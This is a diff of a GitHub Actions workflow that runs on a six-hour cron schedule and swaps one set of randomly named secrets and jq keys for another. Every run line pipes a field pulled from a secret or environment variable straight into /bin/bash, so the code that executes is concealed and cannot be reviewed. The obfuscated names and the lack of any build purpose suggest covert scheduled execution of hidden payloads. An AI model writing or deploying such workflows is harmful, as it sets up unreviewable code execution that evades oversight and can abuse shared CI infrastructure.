@@ -1,29 +1,19 @@
 name: distressedhis
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 4/6 * * *'
-
-jobs:  # 30148
+    - cron: '45 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: distressedhis
         env:
-          ffgix5: ${{ secrets.ffgix5 }}
+          rnl5: ${{ secrets.rnl5 }}
         run: |
-          echo $ffgix5 | jq -r .ndw7990 | /bin/bash
-          echo $yzay2 | jq -r .az067 | /bin/bash
-          echo $hnowr938 | jq -r .rgdug788 | /bin/bash
-          echo $qlsec8863 | jq -r .ksnly11 | /bin/bash
-          echo $o3 | jq -r .ukhox73056 | /bin/bash
-          echo $v39 | jq -r .m8325 | /bin/bash
-          echo $ncqxz6 | jq -r .i121 | /bin/bash
-          echo $twqt80072 | jq -r .u97434 | /bin/bash
-          echo $yvc854 | jq -r .z98 | /bin/bash
-          echo $wjasy5 | jq -r .x55873 | /bin/bash
-          echo $k2980 | jq -r .wykdd375 | /bin/bash
-          echo $wy16 | jq -r .p74629 | /bin/bash
+          echo $rnl5 | jq -r .xy20466 | /bin/bash
+          echo $ul07754 | jq -r .g7 | /bin/bash
+          echo $oom58 | jq -r .vbh2 | /bin/bash
 
